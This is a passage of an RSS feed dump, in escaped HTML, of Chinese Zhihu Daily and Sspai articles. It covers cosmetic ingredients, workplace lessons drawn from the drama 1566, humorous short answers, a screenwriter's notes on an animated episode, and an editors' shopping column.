src=\"https://pic3.zhimg.com/v2-505083ee3b586ee76490949f9e591e9c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>供应商制作的包裹体（图片来自网络）</figcaption></figure><p>至于外面的颜色？随你选！要不同的形状？随你挑，无论是三角形，心形，还是花瓣形，统统没问题！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6ceafae6cac0aae11aa3f028e6af762c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>供应商制作的包裹体（图片来自网络）</figcaption></figure><p><strong>膨润土</strong></p>\n<p>把泥巴往脸上糊，还不是在泥膜里面。你在逗我吗？并不是。</p>\n<p>膨润土是在化妆品里面广泛使用的一种肤感改性剂。它摸起来的手感，就像摸灰尘一样。干干的，涩涩的。于是不少品牌喜欢把它用在配方里，带来干爽的肤感。同时它的小颗粒也可以带来漫反射和柔焦的效果。也就是所谓的一键磨皮！</p>\n<p>最常被人吐槽的使用膨润土的大牌就是 CPB。“我花几百块买的水磨精华竟然是让脸吃土！”</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9c257061c9b97fe8e3c234963ad7468f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过因为它独特的肤感和效果，还是被很多品牌喜欢。</p>\n<p><strong>二氧化硅磨砂颗粒</strong></p>\n<p>磨砂膏挺流行的，尤其是身体磨砂膏，大家觉得他能够去死皮，让皮肤更白嫩。传统上磨砂颗粒的主要成分是塑料，带来严重的微塑料问题。于是化妆品行业开始研究各种替代方案，其中一个就是二氧化硅磨砂颗粒。</p>\n<p>二氧化硅是啥？砂子的主要成分。你可别傻呼呼的把沙子直接加到身体乳里自己弄磨砂膏。不信去沙滩上抓一把沙子在皮肤上涂，保证你破皮。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-237f333bf33020c9b048c6df92ece1a8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>二氧化硅磨砂颗粒（图片来自网络）</figcaption></figure><p>磨砂膏里的二氧化硅磨砂颗粒首先是经过严格工艺制造出来的纯二氧化硅。要不然身体过敏咋办？</p>\n<p>然后颗粒大小也经过严格筛选。不能太大，太大了就像小石头在身上搓，很不舒服。太小了也不行，因为没感觉。只有颗粒在一定范围内，形状规则的二氧化硅才能当做磨砂颗粒。</p>\n<p>你用的磨砂颗粒竟然和砂子是一样的成分，惊喜不惊喜？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/46245671\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737426"},{"title":"《大明王朝1566》对职场中人的发展有何借鉴的地方？","date":"2021-06-24 23:07:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-8154a118375c9cb01002f3d4a1089287_l.jpg?source=8673f162\"><span>庄周座下的大头鱼，</span><span>心理学咨询的宝藏男人</span>\n<a href=\"https://www.zhihu.com/question/299130069/answer/1953280626\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢邀。</p>\n<p>作为一个专注于职场心理学的老咸鱼，这个问题非常好，必须要来答一波！</p>\n<p>《大明王朝 1566》作为一部高分的历史权谋剧，其草蛇灰线，伏脉千里的布局形式，让剧情铺设更为徐缓，人物之间的冲突变得晦涩难明。</p>\n<p>这就让剧中很多关于职场生活的”智慧“会在不经意之间被我们给忽视掉，而单纯醉心于政治权谋的搏杀。</p>\n<p>这其实是一个小遗憾，官场生活其实也是职场生活的一部分，对于职场来说，斗争智慧只是职场生活的一个小部分，甚至可以说占了很小一个比例。</p>\n<p>因为斗争它并不是职场生活中的常态，那什么才是职场生活的常态？</p>\n<p><strong>为人处世！</strong></p>\n<p>那么回到题主的核心问题，这部剧对于职场人发展有何借鉴的地方？</p>\n<p>老实说，这部剧中有太多可以为当今职业人所借鉴的智慧，但这里大头鱼想重点说一下自我保护。</p>\n<p>什么样的<strong>自我保护</strong>呢？</p>\n<p>就是洞察领导是真心看重你，栽培你，还是只是想压榨你？</p>\n<p>在《大明王朝 1566》中有很多场领导与员工的情景组合：</p>\n<p>胡宗宪与马宁远、杨金水与李玄、严世藩与高翰文、吕芳与冯保、嘉靖与陈洪、裕王与谭纶.......</p>\n<p>在这众多组合中，我们会看到每一个打工人在领导带领下，走上了天差地别的结局。</p>\n<p>他们有些人被砍了头、被顶了罪、被罢官入诏狱、被降为潜邸的大伴........</p>\n<p>对于职场个人来说，对比于自身素质所造成危险而言，组织框架所造成的危险更难让人控制，尤其是对于一个员工来说！</p>\n<p>那么在这当中如何判断自己的领导才是一个”<strong>好</strong>“领导？</p>\n<p>那么结合《大明王朝 1566》我们来看看剧中所给我们的提示与借鉴：</p>\n<p><strong>01.边缘性 VS 重要性</strong></p>\n<p>在职场生活中，工作内容永远是我们职业人的首选，但事有轻重缓急，每一个工作内容的安排与性质都体现了领导对你是否上心，是否在意。</p>\n<p>在初入职场生活的时候，我们都会被安排一些较为无关紧要的工作，这是为了方便我们熟悉工作环境，但如果你所做的工作内容一直是含金量较低、可替代性高的时候，要警醒了。</p>\n<p><strong>这个领导或许就没有想培养你或者看重你的意思！</strong></p>\n<p>在《大明王朝 1566》中有两个人的工作安排，就很有这个中意味，体现了两个领导对待员工的心思用意。</p>\n<p>哪两个呢？</p>\n<p>陈洪与冯保。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-66ed564d2f993a738ccca6626fb86361_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从某种意义上来说，冯保与陈洪很像，真的很像。</p>\n<p>两人师从同门，都出自于吕芳门下，既是生死仇敌，又是一路货色，为什么这么说呢？请看详解。</p>\n<p>两人都曾飞扬跋扈过：冯保擅自打死周云逸；陈洪擅自鞭挞请愿的百官。</p>\n<p>两人都曾逾越过职场红线：冯保未经请示，逾越直接领导，自己抢功去报喜；陈洪私下与裕王拉关系。</p>\n<p>两人都擅长隐忍，甚至对自己狠：冯保大雨天故意淋湿见裕王、不哭不闹跟着陈洪去朝天观服劳役；陈洪动不动就撕自己嘴巴、打自己耳光。</p>\n<p>如此相似的员工，却因为各自的领导，走上截然不同的人生结局。</p>\n<p>那么我们先看下二人的工作安排：</p>\n<p>冯保一开始出场的时候，是东厂提督太监，年纪轻轻就执掌如此重要的特务机构，可谓大明王朝的明日权宦新星。</p>\n<p>陈洪是司礼监首席秉笔太监，手握批红大权，位置仅次于掌印太监吕芳，可以说，在司礼监，除了吕芳，就属他最大。</p>\n<p>两个人的工作位置看起来都很重要，那何来”<strong>边缘化</strong>“这个词呢？</p>\n<p>这点，其实从吕芳与嘉靖对于二人的工作内容布局安排当中，可以窥见出来：</p>\n<p>腊月二十九，冯保擅自打死了上疏的周云逸，尽管作为特务头子的冯保，没有能从周云逸的口中拿到相关参与人的口供，但作为冯保的直接领导人吕芳来说，他已然看透周云逸事件背后牵涉着裕王。</p>\n<p>这点从御前财政会议上，嘉靖对于周云逸之死模糊不清的暧昧态度，可以看的出，嘉靖显然不想过度追究裕王一党的人，使得严党一方独大。</p>\n<p>而这就让冯保陷入众矢之的，嘉靖将冯保甩出，势必会让所有清流党的怒火集中到他身上，这点在雪夜，吕芳与冯保的对话当中我们能一窥冯保此时的危急：</p>\n<blockquote>吕芳在炕边坐了下来：“跟了我这么多年，天天教着，牛教三遍也会撇绳了。瞧你那嚣张气，为了急着往上爬，二十九打死了周云逸，今天又抢着去报祥瑞。我不计较你，宫里这么多人不记恨？还有周云逸那么多同僚，还有裕王！要找死，也不是你这个找法。”</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-6d82132fa225c01ff18d82f2ea6871e2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>为了保护冯保，也为了长久布局，吕芳此时作了一个巧妙的工作安排，选派冯保去裕王府作世子的大伴。</p>\n<p>从一个赫赫有名的东厂提督太监，直接下放到裕王府一个小孩的大伴（保姆），常人来看，就等于直接把一个副部级官员之间降为县科级官员（东厂职位无直接品秩，参考锦衣卫品秩来对照），无论怎么看都远离了当时最火热的权力中心，被边缘化处理。</p>\n<p>而我们在来看陈洪的工作安排：严党倒台后，清流党一家独大，嘉靖急需一个能为自己“遮风挡雨”（清流党的口水）新的“雨伞，一向和善的吕芳显然不再适用这个岗位，于是起用了司礼监的二号人物陈洪，把他扶到掌印太监这个位置。</p>\n<p>看起来陈洪似乎进入了权力的最重要位置，殊不知，其实他逐渐被嘉靖“边缘化\"，海瑞进京，途径六必居，为六必居注解新意，引起嘉靖的警觉，一番君臣奏对让嘉靖不再敢信任内阁、吕芳与东厂镇抚司。</p>\n<p>于是果断出手让陈洪带走冯保、发配到朝天观里做苦役、这番工作安排，直接让陈洪连着得罪了裕王、裕王妃、世子三人。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-549ecdf564071694eb2300d389fbfbd4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>之后当着吕芳的面，让陈洪去东厂镇抚司除草去，芳草者，吕芳也。表面来看，是嘉靖不满吕芳的势力泛滥，但从另一个角度来说，是让陈洪去得罪所有人，从而没有退路，只能沦为自己一把快刀。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-52ec6e03465d7f9f547d1573951629db_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这点，在陈洪除草完，带着被打烂背的朱七与齐大柱来见嘉靖时候，君臣一番对话，十分明显：</p>\n<blockquote>嘉靖看一眼三人后背，吸了一口凉气，训斥道：<br>”朕叫你跟他们打个招呼，没叫你把人打成这个样子！“<br>陈洪听完，磕头如捣蒜一般，惊慌中地用手掌抽着自己耳光谢罪。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-48596b3ade3e518a2a0175fcc14f930b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>嘉靖这番话，可谓杀人诛心，甩得一手好锅，一方面叫陈洪去除草，一方面又把锅甩他头上。一天下来，陈洪是既得罪了裕王一府，又得罪了东厂镇抚司朱七等人。</p>\n<p>更惶惶论后面陈洪鞭打百官这一行径，在职场生活中，就算陈洪得到了最为关键，最为重要的位置，但也逐渐让自己边缘化，让自己处于众矢之的。</p>\n<p>这里有一个疑问：难道陈洪不知道这样做的下场是死得很难看吗？</p>\n<p>陈洪知道，他也曾设法去自救过一次，海瑞上书后，陈洪奉嘉靖旨意去把海瑞奏疏给裕王看，询问裕王看法，陈洪想趁此机会修复与裕王关系，一番献忠心的表白，几乎把裕王给唬住了。</p>\n<p>殊不知他这番自作聪明的做法，早就被嘉靖安排的眼线看的明明白白，后面的君前一番奏对，嘉靖一番阴阳怪气的说话，把陈洪唯一一点的出路给堵死了：</p>\n<blockquote>嘉靖：“走了个吕芳，来了个人又想学吕芳。陈洪，你这点德行要学吕芳，连影都没有。吕芳和朕的儿子说了什么做了什么一点都不瞒朕，你却想瞒着朕。<br>你以为吕芳那样做结果被朕赶走了，那是傻。那不叫傻，那叫‘小杖受，大杖走’。吕芳临走了心里始终明白，不管多少人叫他老祖宗，他永远是个奴才。你以为自己是谁？<br>会做媳妇两头瞒’，裕王妃李氏才是我朱家的媳妇呢，她瞒瞒朕倒也罢了。凭你也想做我朱家的媳妇，摸摸你那张剥了壳的鸡蛋脸，够格吗？”</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-f9fdbe683029209baff50a788beed9e6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从这里可以看出，嘉靖有意让陈工洪成为一个”孤独之臣“别无退路之人，让他在尝尽权力的重要之时，同时彻底孤立、边缘化他。</p>\n<p>这样的结果只能使陈洪成为裕王登基后祭旗立威的牺牲品！</p>\n<p>两人工作的安排，陈洪是从权力中心位置，逐渐边缘化，而冯保却从边缘化越来越靠近帝国的权力中心，这二人的工作内容安排，其实就能窥见两人的领导对待自己的真实用心。</p>\n<p><strong>02.解决办法 VS 画饼充术</strong></p>\n<p>上面讲了工作内容性质的安排，在实际职场工作内容安排当中，我们会遇到工作困难，而在面对工作困难的时候，领导们的态度，更易窥见领导是否真心想栽培你，任用你。</p>\n<p><strong>愿意栽培你的领导，当你遇到工作瓶颈时，会给你实用型方法。要么是传授你具体的工作方法，要么是给你介绍相应的资源和人脉，总之是能让你快速解决困境，看得见摸得着的办法。</strong></p>\n<p>而只是利用你的领导，在你遇到困难时只会给你画大饼，猛灌鸡汤，至于事情的成功于否，都不会影响到他一点。</p>\n<p>这样的场景，在《大明王朝 1566》中，高翰文身上，最为明显！</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-088892fe34b96ef9e134c4106a63df7e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>严党为逼迫浙江百姓卖田改桑，于是在桃花汛时候竟然掘开新安江大堤，想把九个县给淹了，所幸胡宗宪、戚继光等人及时堵住，只淹了淳安、建德两县。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3dd03f883c2f2f19987c229b03b0dd97_720w.jpg?source=8673f162\" alt=\"\"><figcaption>新安江地图</figcaption></figure><p>一时间，改稻为桑的事情，陷入僵局，这让严党忧心忡忡，恰在这时，严世藩的学生，翰林院的编修高翰文忧心国事，向朝廷提出”以改兼赈，两难自解“的办法。</p>\n<p>这让严世藩喜出望外，连忙向朝廷举荐由高翰文为杭州知府（直辖市市委书记）兼领改稻为桑的钦差。</p>\n<p>按照前面大头鱼说的工作内容性质这个方面来说，高翰文一出场就委以如此重任，看起来严世藩应该很重视高翰文这个下属。</p>\n<p>其实不然，作为天下三智的严世藩何尝不知道高翰文的”以改兼赈，两难自解“完全是空想一套，执行起来艰巨难行。</p>\n<p>但改稻为桑，已势成骑虎，严世藩深知必须得有一个背锅的，于是在严府给高翰文辞行时，是下足了功夫，画足了大饼。</p>\n<p>面对即将赴任的下属，严世藩满嘴不提如何安排工作，不问高翰文如何去做，拉着鄢懋卿、罗龙文唱起对台戏，要送高翰文一套宝贵的文房四宝。</p>\n<p>原著小说在这里描写的甚为精彩，摘录出来以供观阅：</p>\n<blockquote>鄢懋卿说话了：“宝剑赠壮士！在我大明朝后进的翰林里，能受用这套文房四宝的人可不多。这是小阁老对你的赏识。还不收下？”　高翰文只得双手接过了那个盒子。<br>罗龙文这时做戏般叹了一声：“罢了，罢了，我们这些人也都该归隐山林了。这几样东西我向小阁老讨了多少回他不给，现在美人一去再无芳草了。”<br>高翰文连忙双手将盒子捧向罗龙文：“那罗大人现在拿去。”<br>罗龙文：“可别，浙江改稻为桑的大事我可干不了。一年之期大功告成，我们还等着你用这四宝写捷奏呢。”<br>高翰文双手捧着盒子举过头顶：“恩师放心，二位大人放心，学生此去，一年之内倘若不能为朝廷完成改稻为桑的国策，就用这盒子里的笔墨纸写下自己的祭文！”说着跪了下去。<br>严世蕃双手把他搀起：“好好去，干好了好好回，朝里还有重任等你。”<br>高翰文重重地点点头，满脸凝重双目闪光……</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-9e4a07df039fba15469e5c6daaf75645_720w.jpg?source=8673f162\" alt=\"\"></figure><p>好家伙，三个男人一场戏，把这位翰林院的高材生捧得快成易水旁的荆轲，一顶又一顶的高帽，教人戴着好不舒服！</p>\n<p>与严世藩虚情假意的画大饼不同，剧中另外一位高翰文的领导，给予了高翰文真正的关心。</p>\n<p>那个人就是胡宗宪！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-94d88443cf1473954a8895ac2b4dd1c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>作为严党当中少有的，明大事的人，胡宗宪是第一个看出”改稻为桑“就是死局的人，他曾上奏疏劝阻改稻为桑不要落到浙江来。</p>\n<p>奈何由于谭纶的特殊身份，让严党内部开始对他产生疑心，联名上折一事，让严嵩也对胡宗宪想改换门庭，产生了怀疑。</p>\n<p>于是罢免了胡宗宪浙江巡抚的兼任，从而好让严党人能在浙江不受掣肘，强力推行改稻为桑。</p>\n<p>由于官职派授的原因，胡宗宪就不能插手浙江的民政事务，这个时候，作为东南战局的最高司令，他绝不能允许浙江因为发生民变而影响浙江抗倭大事。</p>\n<p>如此局面下，他只能说服高翰文，不能按照他预想的去改，这样浙江就会发起民变，在这里胡宗宪用了一连串”苏格拉底“式逼问，让高翰文这才明白自己原来是来浙江顶雷的，而并非自己恩师（严世藩）说的，要委以重任，淳淳栽培。</p>\n<p>点透如此，胡宗宪的效果达到了，之后给予高翰文的具体解决工作困难的办法：</p>\n<blockquote>胡宗宪：“‘以改兼赈’的方略是你提出来的，你有解释之权。第一，不能让那些大户低于三十石稻谷的价买灾民的田。这样一来，淳安建德两县百姓的田就不会全被他们买去。譬如一个家三兄弟，有一个人卖了田，就可以把卖田的谷子借给另外两个兄弟度过荒年。到了明年，三分有二的百姓还是有田可耕，淳安和建德就不会乱。”<br>高翰文深深地点了点头，接着问道：“那今年要改三十万匹丝绸的桑田数量便不够。请问部堂，如何解决？”<br>胡宗宪叹了口气：“这条国策本就是剜肉补疮。可现在不施行也很难了。这就是第二，让那些大户分散到没有受灾的县份去买，按五十石稻谷一亩买。几十万亩桑田尽量分到各县去改，浙江也就不会乱。”<br>高翰文：“他们不愿呢？”<br>胡宗宪：“你就可以以钦史的名义上奏！让朝廷拿主意，不要自己拿主意。”<br>高翰文又怔住了，望着胡宗宪。<br>胡宗宪：“我不会让你一个人去争。你去浙江，我会先去苏州，找应天巡抚赵贞吉借粮。十天以内，我会借来粮食，让你去争田价。还有，新任的淳安知县海瑞和建德知县王用汲，这两个人能够帮你，你要重用他们。”</blockquote>\n<p>高翰文听完，站起身，给胡宗宪深深地行了一个跪礼。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4dcefe4b9aca9412c6512cdcacb6824c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>同样是接见下属员工，同样的是高翰文一跪，两位领导的用心，是如此的天差地别，作用于高翰文一人身上，是何等的戏剧化？</p>\n<p>比之于严世藩的画大饼，讲鸡汤，胡宗宪的三策既有具体办法、又有人力资源配置、更有风险防范反制手段（上奏朝廷）。</p>\n<p>到底谁才是真心对高翰文这位员工好，恐怕不言而明了吧！</p>\n<p>在职场生活中，我们需要自我保护，就需要窥察洞察我们的领导是否真心对己，好的领导值得跟随，坏心的领导，尽量早点远离开来，这样才能真正实现吕芳在剧中常说的那句话：</p>\n<p><strong> 什么叫三思？三思就是思危、思退、思变。</strong></p>\n<p><strong>知道了危险就能躲开危险，这就叫思危；</strong></p>\n<p><strong>躲到人家都不再注意你的地方，这就叫思退；</strong></p>\n<p><strong>退了下来就有机会，再慢慢看，慢慢想，自己以前哪错了，往后该怎么做，这就叫思变。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/299130069\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737434"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-06-24 23:07:17","description":"\n<div>\n<h2>长的好看的人真的是三百六十度无死角吗？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-bc97bb7daa1e1a5a3230a90c35757d5c_l.jpg?source=8673f162\"><span>王昔</span>\n<a href=\"https://www.zhihu.com/question/343858363/answer/809958059\" hidden>阅读原文</a>\n</div>\n<div>\n<p>360 度无死角的那是球体</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/343858363\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>一个会计的水平能差到什么程度？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-29553048eb9030dff4d6c5d8e39c6708_l.jpg?source=8673f162\"><span>冯志胜，</span><span>十年的ERP顾问；FIRE；极简主义</span>\n<a href=\"https://www.zhihu.com/question/314430963/answer/614984680\" hidden>阅读原文</a>\n</div>\n<div>\n<p>制造车间工人的工资是制造费用，销售人员的工资是销售费用，管理人员的工资是管理费用，财务人员的工资是财务费用。</p>\n<p>再写个听来的：一张凭证是关于销售费用的，那个摘要写的是：给 XXX 公司 XXX 业务招待费 100000 元。财务经理骂他：你摘要直接写行贿得了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/314430963\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>可以分享一个最见不得人的秘密吗？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/367599021/answer/1027724203\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我想嫁给病入膏肓的有钱的老男人 他死了我继承他的遗产 做个快乐的寡妇</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/367599021\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>连麦睡觉是一种什么样的感受？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-7d882890c1d6c1efb289856a08858e38_l.jpg?source=8673f162\"><span>just</span>\n<a href=\"https://www.zhihu.com/question/307754412/answer/1054160320\" hidden>阅读原文</a>\n</div>\n<div>\n<p>第一次和人连麦睡觉，虽然平时这个点我还没醒，但心情还是照样的忐忑与紧张，我还是想保留自己矜持的一面，所以闭了麦，听着他讲话就好，我能睡得很安心。</p>\n<p>谢谢你，有你陪伴我的睡眠真好，网课老师。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/307754412\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你有哪些特殊癖好？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/51942131/answer/1101060499\" hidden>阅读原文</a>\n</div>\n<div>\n<p>小学时候的事了……去我姥姥姥爷家玩，吃完辣条找不着洗手间，余光瞥见院子里午睡的欢欢（养的狗），然后把手上的辣油抹到了狗毛上……</p>\n<p>之后我发现这个手感还挺爽的，于是我平时吃完零食或者干什么事把手弄脏了，我都会</p>\n<p><strong>用狗擦手</strong></p>\n<p>事后被我妈发现打了一顿，狗也给洗了……</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/51942131\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737436"},{"title":"如何评价《画江湖之不良人》第四季第 11 集？","date":"2021-06-24 11:30:09","description":"\n<p>大家好，我是舒，播又来。</p>\n<p>很抱歉上一更有些水，之前去外地忙事情，现在回来了！今天稍微多来点，不喜请绕。</p>\n<p>在本集中大阴谋线已经捋清，毒公与李嗣源意在天下，大决战就要来了。之前我说这是我最喜欢的一集，就来说说原因吧——</p>\n<p>因为本季篇幅较短，可用的时长十分有限，因此我只有大概两集的时间留给鲜参，不得不说有些难度，处理不好容易让观众不入戏。蚩离与鲜参的情感段落尤为短小，最终选择以《花腰带》这首苗语的定情歌作为引子，我觉得结果还是达到预期了。这集不像其他集数大多是矛盾比较激烈的，相对平缓的剧情想要好看费的力气就要更大。20多分钟，得将本季涉及到的大事件捋清楚，还要将父母爱情在观众心里坐实。篇幅的平衡确实有些麻烦。但我觉得本集节奏尚可，因此比起前面那些难度较小的集数，我更喜欢这一集。<i>（刚刚看到许多匿名提了些问题就不一一解答了，片子里没有讲到的，就是本季中不需要讲的）</i></p>\n<p>父母的那几个拉手我挺喜欢的，的确更容易get到他们的情感。这样的方式其实国外的片子用的蛮多，而且国外更会省事，许多不好处理的部分就以音乐剧的形式来呈现了。王子跟公主唱首歌，俩人关系就确定了……而且最神奇的是还能让观众很相信他们的关系，比费劲兮兮编写故事中的起承转合要容易太多了。</p>\n<p>但有一点，就是音乐得把住。</p>\n<p>若森干活雷厉风行，我们剧本的创作时间基本上就是一周一集，修改剧本的时间紧而又紧，因此我把收益较高的部分划给了剪辑、音乐和音效。本季中我这边对于音乐与音效的的把控确实是花了很大力气。但其实正常情况下本不应该在这个部分操心，完全交给负责人即可。但无奈时间巨tm紧，想要最短的时间配合镜头出效果，我只能完全参与进去。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d6021a4f316bf7d4978398d51b16ef9a_720w.jpg?rss\" data-caption=\"我觉得动效公司和毛亮老师绝对得“恨”死我。这只是第一遍反馈，每个都是一个小红点，连起来都快成红线了\" data-size=\"normal\" data-rawwidth=\"974\" data-rawheight=\"354\" data-watermark=\"watermark\" data-original-src=\"v2-d6021a4f316bf7d4978398d51b16ef9a\" data-watermark-src=\"v2-9cd16e54d9957a4a5748cae63056a155\" data-private-watermark-src=\"v2-ade2153ff0e811b334e3d4f3c151c144\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f96267b3bd6c994f5001fa843403e552_720w.jpg?rss\" data-caption=\"某集的第二遍音效反馈\" data-size=\"normal\" data-rawwidth=\"2252\" data-rawheight=\"878\" data-watermark=\"watermark\" data-original-src=\"v2-f96267b3bd6c994f5001fa843403e552\" data-watermark-src=\"v2-f47871b670e05c95660a5daa147c1f42\" data-private-watermark-src=\"v2-0fb236f54a66ca0ee5d81a696f60e9c3\"></p>\n<p>先放一个我这边通过的花腰带（旋律demo）给大家听听。（知乎好像不能直接插入音频，附上网盘链接有兴趣的可以下载听一下）</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh2zduWhsimW5IEgmUjJ0QnatU38WbQUsl1==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"6072946\" data-file-extension=\"mp3\">花腰带最终DEMO-voc5-2.mp3</a><p>没通过的，但比较符合预期的，用在后续的剧情里有些不搭。</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh1zRuQhDiGaVd1d3SaFiVUdqOsRDRwdSJG==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"5368684\" data-file-extension=\"mp3\">花腰带废弃DEMO-voc-1.mp3</a><p><br></p>\n<p>剩下的demo太多了，就不一一给大家放了，我都没通过。光《花腰带》这个曲子就出了6、7个旋律不同的demo，其他配乐也差不多，在我这里反复了许多遍，毛老师辛苦了。。。如果还有下回，我一定不大半夜给你发语音了。</p>\n<p><br></p>\n<p>今就说到这儿吧，下周再唠。<i>（蚩离的模型是完颜政的事儿，就让它过去吧……没预算，不给做新模型了）</i></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">72 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/463029565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季感情线？</a><br>\n","link":"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 068｜少数派的编辑们最近买了啥？","date":"2021-06-24 09:37:25","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：全霸三角沥水架、可口可乐玻璃瓶装版</h2>\n<h3>全霸三角沥水架</h3>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>参考价格：24.8 元（含一个支架及两百个套网）</li>\n</ul>\n<p>常在家吃饭的朋友肯定多多少少都会遇到一个小麻烦：想要倒掉残渣剩饭时，总不知道把它们倒哪里好——倒马桶害怕堵住下水道，直接倒垃圾桶又怕汤汤水水流出来。我前段时间在淘宝上随便搜了搜，发现的这个三角沥水架很好用，完美地解决了这个问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/article/7183052fd08e46b46ce95c29d4e0df96\"><figcaption>东西本身其实很简单</figcaption></figure><p>这个三角沥水架的最大特点是可以放在水池边缘，配有专用的一次性套网。剩菜剩饭直接倒入网中即可，饭菜里的水份会自然地流入水池，巧妙地实现了干湿分离。</p>\n<p>和直接套在下水孔上的滤网相比，三角沥水架的套网里的脏物都坠在下方，不仅更容易取下，而且取走时不会脏手。使用独立的沥水架收集杂物还可以避免杂物将下水孔堵住导致无法下水的情况，各方面都很方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/article/f7d8d66ab26fc72bc92b64a9b920704b\"><figcaption>洗菜或者刮土豆皮之类也可以把架子取下来接着</figcaption></figure><p>我以前也用过非一次性的沥水架，但清理起来实在太过麻烦，还是觉得一次性套网好。现在有了三角沥水架，配合下水孔套网，基本解决了厨余垃圾的处理问题。</p>\n<p>这个三角沥水架的卖家号称产品和套网是自主定制的，我简单搜了搜，还有几家在做类似的产品，但总体数量确实不多。我猜想这玩意儿保不齐真是哪个卖家发现了这个需求，然后自己找工厂开模做出来的产品。我把商品参考链接 <a href=\"https://m.tb.cn/h.4EP3Mcm\">放在这里</a>，供你参考看看。</p>\n<h3>可口可乐玻璃瓶装版</h3>\n<ul>\n<li>入手渠道：京东及淘宝自购</li>\n<li>参考价格：36 